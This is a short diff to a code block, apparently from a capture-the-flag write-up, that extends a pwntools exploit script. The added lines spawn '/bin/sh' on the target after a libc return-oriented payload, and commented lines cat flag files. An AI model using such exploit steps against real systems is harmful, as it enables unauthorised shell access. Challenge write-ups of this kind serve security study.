@@ -398,6 +398,12 @@ payload += p64(libc.symbols['exit']) # exit
 
 insert('B' * 8, payload)
 
+r.sendlineafter('>> ', '1')
+r.sendlineafter(': ','/bin/sh')
+
+# r.sendline('cat /var/flag/*')
+# print r.recvline(False)
+
 r.interactive()
 ```
 
